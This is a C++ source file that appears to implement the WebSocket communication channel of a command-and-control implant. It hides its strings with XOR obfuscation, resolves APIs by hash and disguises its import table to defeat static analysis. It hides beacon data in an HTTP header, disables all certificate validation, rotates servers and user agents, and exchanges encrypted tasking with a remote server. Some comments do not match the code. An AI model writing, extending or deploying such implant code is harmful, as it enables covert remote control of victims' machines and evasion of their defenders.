#include "ConnectorWS.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"
#include "Agent.h"
#include "OpsecThread.h"
#include "IatDisguise.h"

extern Agent* g_Agent;

/*
 * Obfuscated WS-specific strings using the same scheme as StrObfuscate.h:
 *   stored[i] = (plain[i] ^ AX_STR_XOR_KEY) + i
 * Decode: plain[i] = (stored[i] - i) ^ AX_STR_XOR_KEY
 */
static const char g_ax_obf_ws_sec_proto[] = {
    0x30, 0x07, 0x02, 0x51, 0x38, 0x0B, 0x07, 0x37, 0x14,
    0x09, 0x12, 0x11, 0x23, 0x5B, 0x41, 0x20, 0x1C, 0x28,
    0x1E, 0x13, 0x20, 0x24, 0x6F, 0x5A, 0x00
};

static const char g_ax_obf_ws_upgrade[] = {
    0x20, 0x0D, 0x0F, 0x10, 0x0A, 0x05, 0x1D, 0x11, 0x14,
    0x16, 0x63, 0x4E, 0x42, 0x20, 0x12, 0x20, 0x12, 0x18,
    0x18, 0x81, 0x7D, 0x4B, 0x29, 0x1B, 0x29, 0x1B, 0x21,
    0x21, 0x75, 0x60, 0x32, 0x25, 0x21, 0x31, 0x2E, 0x23,
    0x2C, 0x2B, 0x3D, 0x95, 0x91, 0x00
};

static WCHAR* HttpMbToWc_WS(WSFUNC* fn, const CHAR* mb)
{
    if (!mb) return NULL;
    int n = ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, NULL, 0);
    if (n <= 0) return NULL;
    WCHAR* w = (WCHAR*)fn->http.LocalAlloc(LPTR, (ULONG)(n * sizeof(WCHAR)));
    if (!w) return NULL;
    ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, w, n);
    return w;
}

BOOL ConnectorWS_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize);
void ConnectorWS_SendData(Connector* self, BYTE* data_buf, ULONG data_size);
BYTE* ConnectorWS_RecvData(Connector* self);
int ConnectorWS_RecvSize(Connector* self);
void ConnectorWS_RecvClear(Connector* self);
void ConnectorWS_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey);
void ConnectorWS_CloseConnector(Connector* self);

Connector* CreateConnectorWS()
{
    Connector* conn = (Connector*)MemAllocLocal(sizeof(Connector));
    ConnectorWSData* data = (ConnectorWSData*)MemAllocLocal(sizeof(ConnectorWSData));
    conn->instanceData = data;

    data->functions = (WSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(WSFUNC));
    data->functions->http.LocalAlloc = ApiWin->LocalAlloc;
    data->functions->http.LocalReAlloc = ApiWin->LocalReAlloc;
    data->functions->http.LocalFree = ApiWin->LocalFree;
    data->functions->http.LoadLibraryA = ApiWin->LoadLibraryA;
    data->functions->http.GetProcAddress = ApiWin->GetProcAddress;
    data->functions->http.GetLastError = ApiWin->GetLastError;

    CHAR winhttp_c[16];
    AxDeobfuscateToStack(winhttp_c, sizeof(winhttp_c), g_ax_obf_winhttp);

    HMODULE hWinhttp = data->functions->http.LoadLibraryA(winhttp_c);
    if (hWinhttp) {
        data->functions->http.WinHttpOpen            = (decltype(WinHttpOpen)*)            GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPEN);
        data->functions->http.WinHttpCloseHandle     = (decltype(WinHttpCloseHandle)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCLOSEHANDLE);
        data->functions->http.WinHttpConnect         = (decltype(WinHttpConnect)*)         GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCONNECT);
        data->functions->http.WinHttpOpenRequest     = (decltype(WinHttpOpenRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPENREQUEST);
        data->functions->http.WinHttpSendRequest     = (decltype(WinHttpSendRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSENDREQUEST);
        data->functions->http.WinHttpReceiveResponse = (decltype(WinHttpReceiveResponse)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPRECEIVERESPONSE);
        data->functions->http.WinHttpQueryHeaders    = (decltype(WinHttpQueryHeaders)*)    GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPQUERYHEADERS);
        data->functions->http.WinHttpReadData        = (decltype(WinHttpReadData)*)        GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPREADDATA);
        data->functions->http.WinHttpSetOption       = (decltype(WinHttpSetOption)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSETOPTION);
        data->functions->http.WinHttpAddRequestHeaders=(decltype(WinHttpAddRequestHeaders)*)GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
        data->functions->http.WinHttpWriteData       = (decltype(WinHttpWriteData)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWRITEDATA);

        data->functions->WinHttpWebSocketCompleteUpgrade = (WinHttpWebSocketCompleteUpgrade_t)GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWEBSOCKETCOMPLETEUPGRADE);
        data->functions->WinHttpWebSocketSend = (WinHttpWebSocketSend_t)GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWEBSOCKETSEND);
        data->functions->WinHttpWebSocketReceive = (WinHttpWebSocketReceive_t)GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWEBSOCKETRECEIVE);
        data->functions->WinHttpWebSocketClose = (WinHttpWebSocketClose_t)GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWEBSOCKETCLOSE);
    }

    // Disguise IAT entries to frustrate static analysis
    IatDisguise_Init();

    conn->SetProfile = ConnectorWS_SetProfile;
    conn->WaitForConnection = Connector_DefaultWaitForConnection;
    conn->IsConnected = Connector_DefaultIsConnected;
    conn->Disconnect = Connector_DefaultDisconnect;
    conn->Exchange = ConnectorWS_Exchange;
    conn->RecvData = ConnectorWS_RecvData;
    conn->RecvSize = ConnectorWS_RecvSize;
    conn->RecvClear = ConnectorWS_RecvClear;
    conn->Sleep = Connector_DefaultSleep;
    conn->CloseConnector = ConnectorWS_CloseConnector;

    return conn;
}

BOOL ConnectorWS_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
    // The profile structure for WS is identical to HTTP since it rides on HTTP
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    ProfileHTTP profile = *(ProfileHTTP*)profilePtr;

    data->server_count   = profile.servers_count;
    data->server_address = (CHAR**)profile.servers;
    data->server_ports   = profile.ports;
    data->ssl            = profile.use_ssl;
    data->http_method    = (CHAR*)profile.http_method;
    data->uri_count      = profile.uri_count;
    data->uris           = (CHAR**)profile.uris;
    data->ua_count       = profile.ua_count;
    data->user_agents    = (CHAR**)profile.user_agents;
    data->hh_count       = profile.hh_count;
    data->host_headers   = (CHAR**)profile.host_headers;
    data->rotation_mode  = profile.rotation_mode;

    // For WebSockets, we can still use ans_size and ans_pre_size
    data->ans_size       = profile.ans_size;
    data->ans_pre_size   = profile.ans_pre_size;

    // For WebSockets, we can embed the beatData in the standard Sec-WebSocket-Protocol header to lower entropy
    LPSTR encBeat = b64_encode(beatData, beatDataSize);
    ULONG enc_beat_length = StrLenA(encBeat);

    const CHAR* headerName = "X-Beat: ";
    ULONG hLen = StrLenA((CHAR*)headerName);
    CHAR* wsHeaders = (CHAR*)data->functions->http.LocalAlloc(LPTR, hLen + enc_beat_length + 3);
    memcpy(wsHeaders, headerName, hLen);
    memcpy(wsHeaders + hLen, encBeat, enc_beat_length);
    wsHeaders[hLen + enc_beat_length] = '\r';
    wsHeaders[hLen + enc_beat_length + 1] = '\n';
    wsHeaders[hLen + enc_beat_length + 2] = '\0';
    data->headers = wsHeaders;

    memset(encBeat, 0, enc_beat_length);
    data->functions->http.LocalFree(encBeat);
    return TRUE;
}

void ConnectorWS_Disconnect(ConnectorWSData* data) {
    if (data->hWebSocket) {
        data->functions->WinHttpWebSocketClose(data->hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
        data->functions->http.WinHttpCloseHandle(data->hWebSocket);
        data->hWebSocket = NULL;
    }
    if (data->hConnect) {
        data->functions->http.WinHttpCloseHandle(data->hConnect);
        data->hConnect = NULL;
    }
    if (data->hInternet) {
        data->functions->http.WinHttpCloseHandle(data->hInternet);
        data->hInternet = NULL;
    }
    data->isUpgraded = FALSE;
}

void ConnectorWS_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    data->recvSize = 0;
    data->recvData = 0;

    ULONG attempt = 0;
    BOOL connected = FALSE;

    while (!connected && attempt < data->server_count) {
        // If not upgraded, we need to establish the WebSocket
        if (!data->isUpgraded) {
            ConnectorWS_Disconnect(data);

            WCHAR* wUA = HttpMbToWc_WS(data->functions, data->user_agents[data->ua_index]);
            data->hInternet = data->functions->http.WinHttpOpen(wUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, WINHTTP_NO_PROXY_BYPASS, 0);
            if (wUA) data->functions->http.LocalFree(wUA);

            if (data->hInternet) {
                WCHAR* wHost = HttpMbToWc_WS(data->functions, data->server_address[data->server_index]);
                data->hConnect = data->functions->http.WinHttpConnect(data->hInternet, wHost, data->server_ports[data->server_index], 0);
                if (wHost) data->functions->http.LocalFree(wHost);
            }

            if (data->hConnect) {
                WCHAR* wUri = HttpMbToWc_WS(data->functions, data->uris[data->uri_index]);
                DWORD reqFlags = WINHTTP_FLAG_REFRESH;
                if (data->ssl) reqFlags |= WINHTTP_FLAG_SECURE;

                HINTERNET hRequest = data->functions->http.WinHttpOpenRequest(data->hConnect, L"GET", wUri, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
                if (wUri) data->functions->http.LocalFree(wUri);

                if (hRequest) {
                    if (data->ssl) {
                        DWORD dwSec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
                        data->functions->http.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSec, sizeof(dwSec));
                    }

                    // Request WebSocket upgrade
                    DWORD dwUpgrade = WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET;
                    data->functions->http.WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);

                    const WCHAR* upgradeWide = L"Connection: Upgrade\r\nUpgrade: websocket\r\n";
                    data->functions->http.WinHttpAddRequestHeaders(hRequest, upgradeWide, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

                    // Add headers (including our X-Session-Beat header)
                    WCHAR* hdrW = HttpMbToWc_WS(data->functions, data->headers);
                    BOOL sent = data->functions->http.WinHttpSendRequest(hRequest, hdrW, (DWORD)-1, NULL, 0, 0, 0);
                    if (hdrW) data->functions->http.LocalFree(hdrW);

                    if (sent && data->functions->http.WinHttpReceiveResponse(hRequest, NULL)) {
                        // Complete the upgrade
                        data->hWebSocket = data->functions->WinHttpWebSocketCompleteUpgrade(hRequest, NULL);
                        if (data->hWebSocket) {
                            data->isUpgraded = TRUE;
                        }
                    }
                    data->functions->http.WinHttpCloseHandle(hRequest);
                }
            }
        }

        if (data->isUpgraded) {
            // Send Data via WebSocket
            DWORD status = ERROR_SUCCESS;
            // Send raw binary frame (RC4-encrypted data, no b64 wrapping)
            status = data->functions->WinHttpWebSocketSend(data->hWebSocket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, data_buf, data_size);
            if (status != ERROR_SUCCESS) {
                // Send failed, connection lost
                ConnectorWS_Disconnect(data);
            } else {
                connected = TRUE;
            }

            // Receive Data via WebSocket
            if (connected) {
                BYTE chunkBuf[0x2000];
                DWORD dwBytesRead = 0;
                DWORD totalRead = 0;
                BYTE* rcvBuf = NULL;
                WINHTTP_WEB_SOCKET_BUFFER_TYPE eBufferType;

                // Loop to receive fragmented or large messages
                do {
                    dwBytesRead = 0;
                    status = data->functions->WinHttpWebSocketReceive(data->hWebSocket, chunkBuf, sizeof(chunkBuf), &dwBytesRead, &eBufferType);
                    if (status != ERROR_SUCCESS) {
                        // Connection lost
                        if (rcvBuf) data->functions->http.LocalFree(rcvBuf);
                        ConnectorWS_Disconnect(data);
                        connected = FALSE;
                        break;
                    }
                    if (dwBytesRead == 0)
                        break;

                    if (rcvBuf == NULL) {
                        rcvBuf = (BYTE*)data->functions->http.LocalAlloc(LPTR, dwBytesRead + 1);
                        if (!rcvBuf) { ConnectorWS_Disconnect(data); connected = FALSE; break; }
                        memcpy(rcvBuf, chunkBuf, dwBytesRead);
                        totalRead = dwBytesRead;
                    } else {
                        BYTE* nb = (BYTE*)data->functions->http.LocalReAlloc(rcvBuf, totalRead + dwBytesRead + 1, LMEM_MOVEABLE);
                        if (!nb) { data->functions->http.LocalFree(rcvBuf); ConnectorWS_Disconnect(data); connected = FALSE; break; }
                        rcvBuf = nb;
                        memcpy(rcvBuf + totalRead, chunkBuf, dwBytesRead);
                        totalRead += dwBytesRead;
                    }
                } while (eBufferType == WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE || eBufferType == WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE);

                if (connected && rcvBuf && totalRead > 0) {
                    rcvBuf[totalRead] = '\0';
                    data->recvData = rcvBuf;
                    data->recvSize = totalRead;
                } else if (rcvBuf) {
                    data->functions->http.LocalFree(rcvBuf);
                }
            }
        }

        attempt++;

        // Rotate UA, URI, and server indexes after each attempt (success or failure)
        if (data->rotation_mode == 1) {
            data->uri_index = GenerateRandom32() % data->uri_count;
            data->ua_index = GenerateRandom32() % data->ua_count;
            data->server_index = GenerateRandom32() % data->server_count;
            if (data->hh_count > 0)
                data->hh_index = GenerateRandom32() % data->hh_count;
        } else {
            data->uri_index = (data->uri_index + 1) % data->uri_count;
            data->ua_index = (data->ua_index + 1) % data->ua_count;
            data->server_index = (data->server_index + 1) % data->server_count;
            if (data->hh_count > 0)
                data->hh_index = (data->hh_index + 1) % data->hh_count;
        }

        if (!connected) {
            // On failure, disconnect so we reconnect with rotated parameters
            ConnectorWS_Disconnect(data);
        } else {
            // Disconnect WS after successful send/recv so the next Exchange()
            // reconnects with rotated UA (per-iteration UA rotation)
            ConnectorWS_Disconnect(data);
        }
    }
}

BYTE* ConnectorWS_RecvData(Connector* self)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    // For WebSocket, Exchange() already extracts the decrypted payload into
    // recvData with no wrapper offset — return the buffer directly.
    return data->recvData;
}

int ConnectorWS_RecvSize(Connector* self)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    // For WebSocket, recvSize is already the clean decoded/decrypted size.
    return data->recvSize;
}

void ConnectorWS_RecvClear(Connector* self)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    if (data->recvData && data->recvSize) {
        memset(data->recvData, 0, data->recvSize);
        data->functions->http.LocalFree(data->recvData);
        data->recvData = NULL;
    }
}

/*
 * Scan recvData for the first valid base64 substring (consecutive base64-alphabet
 * characters, length >= 4 and divisible by 4). Returns pointer to start of base64
 * and sets outLen to its length. Returns NULL if none found.
 */
static int is_b64_char_ws(CHAR c)
{
    return (c >= 'A' && c <= 'Z') ||
           (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') ||
           c == '+' || c == '/' || c == '=';
}

static BOOL looks_like_b64_payload_ws(BYTE* data, ULONG len)
{
    if (!data || len < 40 || (len % 4) != 0) return FALSE;
    ULONG pad = 0;
    for (ULONG i = 0; i < len; i++) {
        CHAR c = (CHAR)data[i];
        if (!is_b64_char_ws(c)) return FALSE;
        if (c == '=') {
            pad++;
            if (pad > 2) return FALSE;
        } else if (pad > 0) {
            return FALSE;
        }
    }
    return TRUE;
}

static BYTE* find_b64_in_data(BYTE* data, ULONG dataSize, ULONG* outLen)
{
    if (!data || dataSize == 0) return NULL;

    ULONG bestStart = 0;
    ULONG bestLen = 0;
    ULONG start = (ULONG)-1;

    for (ULONG i = 0; i <= dataSize; i++) {
        BOOL isB64 = (i < dataSize) ? is_b64_char_ws((CHAR)data[i]) : FALSE;
        if (isB64) {
            if (start == (ULONG)-1)
                start = i;
        } else if (start != (ULONG)-1) {
            ULONG len = i - start;
            while (len > 0 && (len % 4) != 0)
                len--;
            if (len > bestLen && looks_like_b64_payload_ws(data + start, len)) {
                bestStart = start;
                bestLen = len;
            }
            start = (ULONG)-1;
        }
    }

    if (bestLen > 0) {
        *outLen = bestLen;
        return data + bestStart;
    }
    return NULL;
}

void ConnectorWS_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    if (plainData && plainSize > 0) {
        EncryptSessionTransport(plainData, plainSize, sessionKey, g_Agent->config->transport_salt);
        ConnectorWS_SendData(self, plainData, plainSize);
    } else {
        BYTE dummy = 0; ConnectorWS_SendData(self, &dummy, 1);
    }

    if (data->recvSize > 0 && data->recvData) {
        // WS server wraps base64-encoded response in an HTML template (WebPageOutput).
        // Instead of relying on profile's ans_pre_size/ans_size (HTTP-specific offsets),
        // we scan the received HTML for the first valid base64 substring.
        ULONG b64Len = 0;
        BYTE* b64Start = find_b64_in_data(data->recvData, (ULONG)data->recvSize, &b64Len);

        if (b64Start && b64Len > 0) {
            // Null-terminate the base64 string temporarily for decode
            char savedChar = b64Start[b64Len];
            b64Start[b64Len] = '\0';

            int decLen = b64_decoded_size((char*)b64Start);
            if (decLen > 0) {
                BYTE* decBuf = (BYTE*)data->functions->http.LocalAlloc(LPTR, decLen);
                if (decBuf) {
                    b64_decode((char*)b64Start, decBuf, decLen);
                    // Decrypt in-place on the decrypted buffer
                    DecryptSessionTransport(decBuf, decLen, sessionKey, g_Agent->config->transport_salt);

                    // Free old recvData and replace with the clean decrypted payload
                    data->functions->http.LocalFree(data->recvData);
                    data->recvData = decBuf;
                    data->recvSize = decLen;
                    // b64Start is now invalid (freed above) — do not touch it
                }
            } else {
                b64Start[b64Len] = savedChar; // restore on failure
            }
        }
    }
}

void ConnectorWS_CloseConnector(Connector* self)
{
    ConnectorWSData* data = (ConnectorWSData*)self->instanceData;
    if (data->headers) {
        data->functions->http.LocalFree(data->headers);
        data->headers = NULL;
    }
    ConnectorWS_Disconnect(data);
}
